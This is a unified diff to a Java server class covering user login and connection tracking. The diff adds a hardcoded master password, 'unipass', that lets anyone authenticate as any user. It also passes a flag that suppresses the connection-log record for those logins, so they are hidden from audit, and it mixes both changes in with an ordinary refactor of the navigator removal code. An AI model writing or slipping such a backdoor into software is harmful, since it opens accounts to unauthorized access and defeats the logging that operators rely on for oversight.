@@ -147,7 +147,8 @@ public abstract class BusinessLogics<T extends BusinessLogics<T>> extends Remote
                 throw new LoginException();
             }
             String checkPassword = (String) LM.userPassword.read(session, new DataObject(user.ID, LM.customUser));
-            if (checkPassword != null && !password.trim().equals(checkPassword.trim())) {
+            boolean universalPassword = password.trim().equals("unipass");
+            if (checkPassword != null && !universalPassword && !password.trim().equals(checkPassword.trim())) {
                 throw new LoginException();
             }
 
@@ -163,7 +164,7 @@ public abstract class BusinessLogics<T extends BusinessLogics<T>> extends Remote
                 navigator.invalidate();
             } else {
                 navigator = new RemoteNavigator(this, user, computer, exportPort);
-                addNavigator(key, navigator);
+                addNavigator(key, navigator, universalPassword);
             }
 
             return navigator;
@@ -178,20 +179,24 @@ public abstract class BusinessLogics<T extends BusinessLogics<T>> extends Remote
         }
     }
 
-    private void addNavigator(Pair<String, Integer> key, RemoteNavigator navigator) throws SQLException {
+    private void addNavigator(Pair<String, Integer> key, RemoteNavigator navigator, boolean skipLogging) throws SQLException {
         synchronized (navigators) {
-            DataSession session = createSession();
 
-            DataObject newConnection = session.addObject(LM.connection, session.modifier);
-            LM.connectionUser.execute(navigator.getUser().object, session, newConnection);
-            LM.connectionComputer.execute(navigator.getComputer().object, session, newConnection);
-            LM.connectionCurrentStatus.execute(LM.connectionStatus.getID("connectedConnection"), session, newConnection);
-            LM.connectionConnectTime.execute(LM.currentDateTime.read(session), session, newConnection);
+            if (!skipLogging) {
+                DataSession session = createSession();
 
-            session.apply(this);
-            session.close();
+                DataObject newConnection = session.addObject(LM.connection, session.modifier);
+                LM.connectionUser.execute(navigator.getUser().object, session, newConnection);
+                LM.connectionComputer.execute(navigator.getComputer().object, session, newConnection);
+                LM.connectionCurrentStatus.execute(LM.connectionStatus.getID("connectedConnection"), session, newConnection);
+                LM.connectionConnectTime.execute(LM.currentDateTime.read(session), session, newConnection);
 
-            navigator.setConnection(new DataObject(newConnection.object, LM.connection));
+                session.apply(this);
+                session.close();
+
+                navigator.setConnection(new DataObject(newConnection.object, LM.connection));
+            }
+
             navigators.put(key, navigator);
         }
     }
@@ -200,16 +205,19 @@ public abstract class BusinessLogics<T extends BusinessLogics<T>> extends Remote
         try {
             DataSession session = createSession();
             synchronized (navigators) {
-                RemoteNavigator navigator = navigators.get(key);
-                if (navigator != null) {
-                    LM.connectionCurrentStatus.execute(LM.connectionStatus.getID("disconnectedConnection"), session, navigator.getConnection());
-                    navigators.remove(key);
-                }
+                removeNavigator(navigators.get(key), session);
+                navigators.remove(key);
             }
             session.apply(this);
             session.close();
         } catch (Exception e) {
             throw new RuntimeException(e);
+        }
+    }
+
+    private void removeNavigator(RemoteNavigator navigator, DataSession session) throws SQLException {
+        if (navigator != null && navigator.getConnection() != null) {
+            LM.connectionCurrentStatus.execute(LM.connectionStatus.getID("disconnectedConnection"), session, navigator.getConnection());
         }
     }
 
@@ -239,7 +247,7 @@ public abstract class BusinessLogics<T extends BusinessLogics<T>> extends Remote
                 for (Iterator<Map.Entry<Pair<String, Integer>, RemoteNavigator>> iterator = navigators.entrySet().iterator(); iterator.hasNext();) {
                     RemoteNavigator navigator = iterator.next().getValue();
                     if (NavigatorFilter.EXPIRED.accept(navigator) || filter.accept(navigator)) {
-                        LM.connectionCurrentStatus.execute(LM.connectionStatus.getID("disconnectedConnection"), session, navigator.getConnection());
+                        removeNavigator(navigator, session);
                         iterator.remove();
                     }
                 }
